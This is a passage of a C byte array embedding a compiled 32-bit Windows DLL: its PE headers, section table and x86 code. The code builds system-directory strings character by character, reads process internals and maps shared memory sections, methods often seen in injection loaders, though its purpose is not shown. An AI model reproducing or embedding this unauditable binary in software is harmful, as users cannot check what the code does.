	0xA1, 0xE5, 0xD4, 0xB3, 0xE5, 0x84, 0xBA, 0xE0, 0xE5, 0x84, 0xBA, 0xE0, 0xE5, 0x84, 0xBA, 0xE0,
	0x91, 0x05, 0xBC, 0xE1, 0xE4, 0x84, 0xBA, 0xE0, 0x62, 0x0D, 0xB9, 0xE1, 0xE4, 0x84, 0xBA, 0xE0,
	0x62, 0x0D, 0xBE, 0xE1, 0xE4, 0x84, 0xBA, 0xE0, 0x91, 0x05, 0xBB, 0xE1, 0xEA, 0x84, 0xBA, 0xE0,
	0xE5, 0x84, 0xBB, 0xE0, 0x8F, 0x84, 0xBA, 0xE0, 0x6B, 0x0D, 0xB2, 0xE1, 0xF5, 0x84, 0xBA, 0xE0,
	0x6B, 0x0D, 0xBA, 0xE1, 0xE4, 0x84, 0xBA, 0xE0, 0x6B, 0x0D, 0xB8, 0xE1, 0xE4, 0x84, 0xBA, 0xE0,
	0x52, 0x69, 0x63, 0x68, 0xE5, 0x84, 0xBA, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x04, 0x00, 0x68, 0xF0, 0xD4, 0x68, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x02, 0x21, 0x0B, 0x01, 0x0E, 0x2C, 0x00, 0x26, 0x00, 0x00,
	0x00, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0x23, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x06, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0xA0, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x81, 0x9D, 0x00, 0x00, 0x02, 0x00, 0x40, 0x05,
	0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x90, 0x44, 0x00, 0x00, 0xA8, 0x28, 0x00, 0x00,
	0xD4, 0x6E, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x90, 0x00, 0x00, 0xC0, 0x01, 0x00, 0x00, 0x68, 0x44, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x60, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00,
	0xB4, 0x24, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x26, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60,
	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x50, 0x37, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
	0x00, 0x38, 0x00, 0x00, 0x00, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00,
	0x74, 0x08, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x62, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0,
	0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0xC0, 0x01, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C, 0x33, 0xC0, 0x56, 0x8B, 0x75, 0x10, 0x85, 0xF6, 0x74, 0x02,
	0x89, 0x06, 0x85, 0xC9, 0x75, 0x11, 0x8B, 0x45, 0x08, 0x85, 0xC0, 0x74, 0x03, 0x66, 0x89, 0x08,
	0x33, 0xC0, 0xE9, 0xBE, 0x00, 0x00, 0x00, 0x8B, 0x55, 0x08, 0x8B, 0xF0, 0x53, 0xC7, 0x45, 0xF8,
	0x20, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xFC, 0x22, 0x00, 0x00, 0x00, 0x57, 0x8B, 0xF8, 0x0F, 0xB7,
	0x01, 0x8B, 0xD8, 0x66, 0x3B, 0x45, 0xF8, 0x75, 0x10, 0x6A, 0x20, 0x5B, 0x83, 0xC1, 0x02, 0x0F,
	0xB7, 0x01, 0x66, 0x3B, 0xC3, 0x74, 0xF5, 0x8B, 0xD8, 0x66, 0x85, 0xDB, 0x74, 0x69, 0x66, 0x3B,
	0x5D, 0xFC, 0x8D, 0x41, 0x02, 0x6A, 0x20, 0x0F, 0x44, 0xC8, 0x58, 0x6A, 0x22, 0x5B, 0x0F, 0x44,
	0xC3, 0x0F, 0xB7, 0xC0, 0x89, 0x45, 0xF4, 0x0F, 0xB7, 0x01, 0x66, 0x3B, 0xC3, 0x74, 0x31, 0x8B,
	0xD8, 0x66, 0x3B, 0x5D, 0xF4, 0x74, 0x29, 0x0F, 0xB7, 0x01, 0x66, 0x85, 0xC0, 0x74, 0x2D, 0x47,
	0x81, 0xFF, 0x04, 0x01, 0x00, 0x00, 0x73, 0x0A, 0x85, 0xD2, 0x74, 0x06, 0x66, 0x89, 0x02, 0x83,
	0xC2, 0x02, 0x83, 0xC1, 0x02, 0x0F, 0xB7, 0x01, 0x8B, 0xD8, 0x66, 0x3B, 0x45, 0xFC, 0x75, 0xD1,
	0x33, 0xC0, 0x66, 0x39, 0x01, 0x74, 0x07, 0x83, 0xC1, 0x02, 0xEB, 0x02, 0x33, 0xC0, 0x83, 0xC6,
	0x01, 0x0F, 0x84, 0x75, 0xFF, 0xFF, 0xFF, 0x8B, 0x75, 0x10, 0x85, 0xD2, 0x74, 0x05, 0x33, 0xC0,
	0x66, 0x89, 0x02, 0x85, 0xF6, 0x74, 0x02, 0x89, 0x3E, 0x81, 0xFF, 0x04, 0x01, 0x00, 0x00, 0x5F,
	0x1B, 0xC0, 0xF7, 0xD8, 0x5B, 0x5E, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x51, 0x51, 0x53, 0x56, 0x57,
	0x8B, 0xD9, 0x33, 0xF6, 0x6A, 0x0A, 0x59, 0x8B, 0xFA, 0x46, 0x89, 0x7D, 0xF8, 0x8B, 0xC3, 0x3B,
	0xD9, 0x72, 0x09, 0x33, 0xD2, 0xF7, 0xF1, 0x46, 0x3B, 0xC1, 0x73, 0xF7, 0x85, 0xFF, 0x74, 0x38,
	0x8D, 0x0C, 0x36, 0x85, 0xF6, 0x74, 0x2B, 0x8D, 0x47, 0xFE, 0x03, 0xC1, 0x8B, 0xCE, 0x89, 0x45,
	0xFC, 0x8B, 0xF8, 0x8B, 0xC3, 0x33, 0xD2, 0x6A, 0x0A, 0x5B, 0xF7, 0xF3, 0x8B, 0xD8, 0x8D, 0x42,
	0x30, 0x66, 0x89, 0x07, 0x8D, 0x7F, 0xFE, 0x83, 0xE9, 0x01, 0x75, 0xE7, 0x8B, 0x7D, 0xF8, 0x8D,
	0x0C, 0x36, 0x33, 0xC0, 0x66, 0x89, 0x04, 0x39, 0x5F, 0x8B, 0xC6, 0x5E, 0x5B, 0xC9, 0xC3, 0x64,
	0xA1, 0x18, 0x00, 0x00, 0x00, 0x51, 0x6A, 0x08, 0x8B, 0x40, 0x30, 0xFF, 0x70, 0x18, 0xFF, 0x15,
	0xF4, 0x40, 0x00, 0x10, 0xC3, 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0x51, 0x6A, 0x00, 0x8B, 0x40,
	0x30, 0xFF, 0x70, 0x18, 0xFF, 0x15, 0x38, 0x41, 0x00, 0x10, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC,
	0x54, 0x53, 0x56, 0x57, 0x6A, 0x5C, 0x8A, 0xDA, 0x8B, 0xF1, 0x5A, 0x6A, 0x73, 0x59, 0x6A, 0x79,
	0x58, 0x6A, 0x74, 0x66, 0x89, 0x45, 0xF4, 0x33, 0xC0, 0x66, 0x89, 0x45, 0xF8, 0x58, 0x6A, 0x65,
	0x66, 0x89, 0x45, 0xD0, 0x58, 0x6A, 0x6D, 0x66, 0x89, 0x45, 0xD2, 0x58, 0x6A, 0x33, 0x66, 0x89,
	0x45, 0xD4, 0x58, 0x6A, 0x32, 0x66, 0x89, 0x45, 0xD6, 0x58, 0x6A, 0x77, 0x66, 0x89, 0x45, 0xD8,
	0x33, 0xC0, 0x66, 0x89, 0x4D, 0xF2, 0x66, 0x89, 0x4D, 0xF6, 0x59, 0x6A, 0x6F, 0x66, 0x89, 0x45,
	0xDC, 0x58, 0x66, 0x89, 0x45, 0xE2, 0x6A, 0x36, 0x58, 0x66, 0x89, 0x45, 0xE6, 0x6A, 0x34, 0x58,
	0x66, 0x89, 0x45, 0xE8, 0x33, 0xC0, 0x66, 0x89, 0x55, 0xF0, 0x66, 0x89, 0x55, 0xDA, 0x66, 0x89,
	0x55, 0xEA, 0xBA, 0x30, 0x00, 0xFE, 0x7F, 0x66, 0x89, 0x4D, 0xE0, 0x66, 0x89, 0x4D, 0xE4, 0x8B,
	0xCE, 0x66, 0x89, 0x45, 0xEC, 0xE8, 0x8D, 0x0F, 0x00, 0x00, 0x8D, 0x55, 0xF0, 0xE8, 0xD3, 0x0E,
	0x00, 0x00, 0x84, 0xDB, 0x74, 0x34, 0x6A, 0x20, 0x5F, 0x8B, 0xCF, 0x8D, 0x45, 0xB0, 0x33, 0xD2,
	0x88, 0x10, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x52, 0x57, 0x8D, 0x45, 0xB0, 0x89, 0x7D, 0xB0,
	0x50, 0x52, 0x6A, 0xFF, 0xFF, 0x15, 0x08, 0x41, 0x00, 0x10, 0x85, 0xC0, 0x78, 0x0C, 0x8B, 0x45,
	0xCC, 0x8D, 0x55, 0xE0, 0xD1, 0xE8, 0xA8, 0x01, 0x75, 0x03, 0x8D, 0x55, 0xD0, 0x8B, 0xCE, 0xE8,
	0x91, 0x0E, 0x00, 0x00, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x4C, 0x53,
	0x56, 0x0F, 0xB7, 0xF1, 0xBB, 0xCB, 0x09, 0x06, 0x03, 0x57, 0xC1, 0xE6, 0x10, 0x8B, 0xFA, 0x81,
	0xCE, 0x41, 0x6C, 0x00, 0x00, 0x66, 0xC7, 0x45, 0xF6, 0x2D, 0x5F, 0xB1, 0x61, 0x8D, 0x55, 0xD2,
	0x8D, 0x41, 0xE0, 0x88, 0x0A, 0x88, 0x42, 0xE6, 0x8D, 0x41, 0x9F, 0x3C, 0x0A, 0x7D, 0x06, 0x8D,
	0x41, 0xCF, 0x88, 0x42, 0x1A, 0x42, 0xFE, 0xC1, 0x8D, 0x41, 0x9F, 0x3C, 0x1A, 0x7C, 0xE1, 0x6A,
	0x0D, 0x59, 0x8B, 0xC3, 0x83, 0xE0, 0x3F, 0x0F, 0xAC, 0xF3, 0x05, 0xC1, 0xEE, 0x05, 0x66, 0x0F,
	0xBE, 0x44, 0x05, 0xB8, 0x66, 0x89, 0x07, 0x8D, 0x7F, 0x02, 0x83, 0xE9, 0x01, 0x75, 0xE3, 0x33,
	0xC0, 0x66, 0x89, 0x07, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x30, 0x01,
	0x00, 0x00, 0x53, 0x33, 0xDB, 0x66, 0xC7, 0x45, 0xF8, 0x00, 0x01, 0x56, 0x89, 0x5D, 0xF0, 0x8D,
	0x85, 0xD0, 0xFE, 0xFF, 0xFF, 0x89, 0x5D, 0xF4, 0xB9, 0x00, 0x01, 0x00, 0x00, 0xC7, 0x45, 0xD8,
	0x18, 0x00, 0x00, 0x00, 0x89, 0x5D, 0xDC, 0x89, 0x5D, 0xE0, 0x89, 0x5D, 0xE4, 0x89, 0x5D, 0xE8,
	0x89, 0x5D, 0xEC, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x8D, 0x95, 0xD0, 0xFE, 0xFF,
	0xFF, 0xB9, 0x66, 0x65, 0x00, 0x00, 0xE8, 0x3E, 0xFF, 0xFF, 0xFF, 0x8D, 0x85, 0xD0, 0xFE, 0xFF,
	0xFF, 0x50, 0x8D, 0x45, 0xD0, 0x50, 0xFF, 0x15, 0x14, 0x41, 0x00, 0x10, 0x53, 0x8D, 0x45, 0xD0,
	0x50, 0xFF, 0x15, 0x00, 0x41, 0x00, 0x10, 0x89, 0x45, 0xFC, 0x85, 0xC0, 0x74, 0x67, 0x6A, 0x01,
	0xFF, 0x15, 0xF8, 0x40, 0x00, 0x10, 0x8B, 0xC8, 0xE8, 0x02, 0xFE, 0xFF, 0xFF, 0x8B, 0xF0, 0x85,
	0xF6, 0x74, 0x52, 0x6A, 0x01, 0x8D, 0x45, 0xF4, 0x50, 0x56, 0xFF, 0x15, 0xF0, 0x40, 0x00, 0x10,
	0x85, 0xC0, 0x78, 0x3A, 0x53, 0x56, 0xFF, 0x15, 0xFC, 0x40, 0x00, 0x10, 0x56, 0x89, 0x18, 0x8D,
	0x45, 0xFC, 0x50, 0xFF, 0x15, 0x44, 0x41, 0x00, 0x10, 0x85, 0xC0, 0x79, 0x09, 0x56, 0xFF, 0x15,
	0x28, 0x41, 0x00, 0x10, 0xEB, 0x1F, 0xFF, 0x75, 0xFC, 0x8D, 0x45, 0xD8, 0x50, 0x68, 0x00, 0x00,
	0x00, 0x02, 0x8D, 0x45, 0xF0, 0x50, 0xFF, 0x15, 0x40, 0x41, 0x00, 0x10, 0xEB, 0x07, 0x8B, 0xCE,
	0xE8, 0xC0, 0xFD, 0xFF, 0xFF, 0x39, 0x5D, 0xFC, 0x74, 0x09, 0xFF, 0x75, 0xFC, 0xFF, 0x15, 0x0C,
	0x41, 0x00, 0x10, 0x8B, 0x45, 0xF0, 0x5E, 0x5B, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x74,
	0x09, 0x00, 0x00, 0x53, 0x56, 0x57, 0x33, 0xDB, 0x89, 0x4D, 0xEC, 0xBF, 0x00, 0x10, 0x00, 0x00,
	0x89, 0x5D, 0xFC, 0x89, 0x5D, 0xF8, 0x89, 0x7D, 0xF0, 0xE8, 0xEB, 0xFE, 0xFF, 0xFF, 0x8B, 0xF0,
	0x89, 0x75, 0xF4, 0x85, 0xF6, 0x0F, 0x84, 0x0C, 0x01, 0x00, 0x00, 0xB9, 0x00, 0x01, 0x00, 0x00,
	0x8D, 0x85, 0xC8, 0xFE, 0xFF, 0xFF, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x8D, 0x95,
	0xC8, 0xFE, 0xFF, 0xFF, 0xB9, 0x64, 0x63, 0x00, 0x00, 0xE8, 0x4B, 0xFE, 0xFF, 0xFF, 0x8D, 0x85,
	0xC8, 0xFE, 0xFF, 0xFF, 0x50, 0x8D, 0x45, 0xCC, 0x50, 0xFF, 0x15, 0x14, 0x41, 0x00, 0x10, 0x8D,
	0x45, 0xCC, 0xC7, 0x45, 0xD4, 0x18, 0x00, 0x00, 0x00, 0x89, 0x45, 0xDC, 0x8D, 0x45, 0xD4, 0x50,
	0x68, 0x1F, 0x00, 0x0F, 0x00, 0x8D, 0x45, 0xFC, 0x89, 0x75, 0xD8, 0x50, 0xC7, 0x45, 0xE0, 0x40,
	0x00, 0x00, 0x00, 0x89, 0x5D, 0xE4, 0x89, 0x5D, 0xE8, 0xFF, 0x15, 0x48, 0x41, 0x00, 0x10, 0x85,
	0xC0, 0x0F, 0x88, 0x99, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x68, 0x00, 0x00, 0x10, 0x00, 0x6A, 0x02,
	0x8D, 0x45, 0xF0, 0x50, 0x53, 0x57, 0x53, 0x8D, 0x45, 0xF8, 0x50, 0x6A, 0xFF, 0xFF, 0x75, 0xFC,
	0xFF, 0x15, 0xE8, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x78, 0x6D, 0xB9, 0x34, 0x08, 0x00, 0x00, 0x8D,
	0x85, 0x90, 0xF6, 0xFF, 0xFF, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0xFF, 0x75, 0xFC,
	0x8B, 0x75, 0xF8, 0x8D, 0xBD, 0x90, 0xF6, 0xFF, 0xFF, 0xB9, 0x0D, 0x02, 0x00, 0x00, 0xF3, 0xA5,
	0x6A, 0xFF, 0xFF, 0x15, 0x3C, 0x41, 0x00, 0x10, 0x8B, 0xB5, 0x90, 0xF6, 0xFF, 0xFF, 0x8D, 0x85,
	0x90, 0xF6, 0xFF, 0xFF, 0x68, 0x34, 0x08, 0x00, 0x00, 0x50, 0x53, 0x89, 0x9D, 0x90, 0xF6, 0xFF,
	0xFF, 0xFF, 0x15, 0x30, 0x41, 0x00, 0x10, 0x3B, 0xF0, 0x75, 0x19, 0x8B, 0x7D, 0xEC, 0xB9, 0x0D,
	0x02, 0x00, 0x00, 0x89, 0xB5, 0x90, 0xF6, 0xFF, 0xFF, 0x33, 0xDB, 0x8D, 0xB5, 0x90, 0xF6, 0xFF,
	0xFF, 0x43, 0xF3, 0xA5, 0x8B, 0x75, 0xF4, 0xFF, 0x75, 0xFC, 0xFF, 0x15, 0x20, 0x41, 0x00, 0x10,
	0x56, 0xFF, 0x15, 0x20, 0x41, 0x00, 0x10, 0x5F, 0x5E, 0x8B, 0xC3, 0x5B, 0xC9, 0xC3, 0x55, 0x8B,
	0xEC, 0x83, 0xEC, 0x24, 0x53, 0x56, 0x57, 0x33, 0xDB, 0x8B, 0xF9, 0x89, 0x5D, 0xFC, 0xE8, 0xB6,
	0xFD, 0xFF, 0xFF, 0x8B, 0xF0, 0x85, 0xF6, 0x74, 0x57, 0x57, 0x8D, 0x45, 0xF4, 0x50, 0xFF, 0x15,
	0x14, 0x41, 0x00, 0x10, 0x8D, 0x45, 0xF4, 0xC7, 0x45, 0xDC, 0x18, 0x00, 0x00, 0x00, 0x89, 0x45,
	0xE4, 0x8D, 0x45, 0xDC, 0x50, 0x68, 0x03, 0x00, 0x1F, 0x00, 0x8D, 0x45, 0xFC, 0x89, 0x75, 0xE0,
	0x50, 0xC7, 0x45, 0xE8, 0x40, 0x00, 0x00, 0x00, 0x89, 0x5D, 0xEC, 0x89, 0x5D, 0xF0, 0xFF, 0x15,
	0x04, 0x41, 0x00, 0x10, 0x8B, 0x3D, 0x20, 0x41, 0x00, 0x10, 0x85, 0xC0, 0x78, 0x0F, 0x53, 0xFF,
	0x75, 0xFC, 0xFF, 0x15, 0x34, 0x41, 0x00, 0x10, 0xFF, 0x75, 0xFC, 0xFF, 0xD7, 0x56, 0xFF, 0xD7,
	0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x51, 0x51, 0x83, 0xF9, 0xFF, 0x74, 0x16, 0x8B,
	0xC1, 0xB9, 0x10, 0x27, 0x00, 0x00, 0xF7, 0xE1, 0xF7, 0xD8, 0x89, 0x45, 0xF8, 0x83, 0xD2, 0x00,
	0xF7, 0xDA, 0x89, 0x55, 0xFC, 0x8D, 0x45, 0xF8, 0x50, 0x6A, 0x00, 0xFF, 0x15, 0x1C, 0x41, 0x00,
	0x10, 0xC9, 0xC3, 0x8B, 0xD1, 0x85, 0xD2, 0x0F, 0x84, 0x8F, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x18,
	0x00, 0x00, 0x00, 0x56, 0x8B, 0x40, 0x30, 0x8B, 0x70, 0x10, 0xC7, 0x02, 0x44, 0x00, 0x00, 0x00,
	0x8B, 0x86, 0x84, 0x00, 0x00, 0x00, 0x89, 0x42, 0x04, 0x8B, 0x46, 0x7C, 0x89, 0x42, 0x08, 0x8B,
	0x46, 0x74, 0x89, 0x42, 0x0C, 0x8B, 0x46, 0x4C, 0x89, 0x42, 0x10, 0x8B, 0x46, 0x50, 0x89, 0x42,
	0x14, 0x8B, 0x46, 0x54, 0x89, 0x42, 0x18, 0x8B, 0x46, 0x58, 0x89, 0x42, 0x1C, 0x8B, 0x46, 0x5C,
	0x89, 0x42, 0x20, 0x8B, 0x46, 0x60, 0x89, 0x42, 0x24, 0x8B, 0x46, 0x64, 0x89, 0x42, 0x28, 0x8B,
	0x4E, 0x68, 0x89, 0x4A, 0x2C, 0x66, 0x8B, 0x46, 0x6C, 0x66, 0x89, 0x42, 0x30, 0x66, 0x8B, 0x86,
	0x88, 0x00, 0x00, 0x00, 0x66, 0x89, 0x42, 0x32, 0x8B, 0x86, 0x8C, 0x00, 0x00, 0x00, 0x89, 0x42,
	0x34, 0xF7, 0xC1, 0x00, 0x03, 0x00, 0x00, 0x74, 0x12, 0x8B, 0x46, 0x18, 0x89, 0x42, 0x38, 0x8B,
	0x46, 0x1C, 0x89, 0x42, 0x3C, 0x8B, 0x46, 0x20, 0x89, 0x42, 0x40, 0x5E, 0xC3, 0x55, 0x8B, 0xEC,
	0x81, 0xEC, 0x8C, 0x06, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8B, 0xF9, 0x8D, 0x85, 0x88, 0xFD, 0xFF,
	0xFF, 0x6A, 0x10, 0x33, 0xC9, 0x89, 0x7D, 0xF0, 0x5B, 0x8B, 0xF2, 0x89, 0x4D, 0xFC, 0x89, 0x5D,
	0xF4, 0xBA, 0x0A, 0x02, 0x00, 0x00, 0x89, 0x4D, 0xF8, 0x88, 0x08, 0x40, 0x83, 0xEA, 0x01, 0x75,
	0xF8, 0xB2, 0x01, 0x8D, 0x8D, 0x88, 0xFD, 0xFF, 0xFF, 0xE8, 0xFD, 0xFA, 0xFF, 0xFF, 0x6A, 0x44,
	0x5A, 0x8B, 0xCA, 0x8D, 0x45, 0x98, 0xC6, 0x00, 0x00, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF7, 0x8D,
	0x4D, 0x98, 0x89, 0x55, 0x98, 0xE8, 0x09, 0xFF, 0xFF, 0xFF, 0x85, 0xFF, 0x0F, 0x84, 0x9B, 0x00,
	0x00, 0x00, 0x85, 0xF6, 0x0F, 0x84, 0x93, 0x00, 0x00, 0x00, 0x8D, 0x8E, 0x00, 0x10, 0x00, 0x00,
	0xE8, 0x9A, 0xFA, 0xFF, 0xFF, 0x8B, 0xF8, 0x85, 0xFF, 0x74, 0x1B, 0x56, 0xFF, 0x75, 0xF0, 0xC7,
	0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0x57, 0xC7, 0x45, 0xFC, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x6D,
	0x18, 0x00, 0x00, 0x83, 0xC4, 0x0C, 0x8B, 0x4D, 0xF8, 0x33, 0xD2, 0x6A, 0x05, 0x58, 0x66, 0x89,
	0x45, 0xC8, 0x8D, 0x45, 0xE0, 0xC7, 0x45, 0xC4, 0x01, 0x00, 0x00, 0x00, 0x88, 0x10, 0x40, 0x83,
	0xEB, 0x01, 0x75, 0xF8, 0x8D, 0x45, 0xE0, 0x50, 0x8D, 0x45, 0x98, 0x50, 0x8D, 0x85, 0x88, 0xFD,
	0xFF, 0xFF, 0x50, 0x52, 0xFF, 0x75, 0xF4, 0x52, 0x52, 0x52, 0x57, 0x51, 0x52, 0xFF, 0x15, 0x00,
	0x40, 0x00, 0x10, 0x8B, 0xD8, 0x85, 0xDB, 0x74, 0x10, 0xFF, 0x75, 0xE0, 0x8B, 0x35, 0x20, 0x41,
	0x00, 0x10, 0xFF, 0xD6, 0xFF, 0x75, 0xE4, 0xFF, 0xD6, 0x83, 0x7D, 0xFC, 0x00, 0x74, 0x07, 0x8B,
	0xCF, 0xE8, 0x2F, 0xFA, 0xFF, 0xFF, 0x5F, 0x5E, 0x8B, 0xC3, 0x5B, 0xC9, 0xC3, 0xB9, 0x10, 0x04,
	0x00, 0x00, 0x8D, 0x85, 0x78, 0xF9, 0xFF, 0xFF, 0xC6, 0x00, 0x00, 0x40, 0x83, 0xE9, 0x01, 0x75,
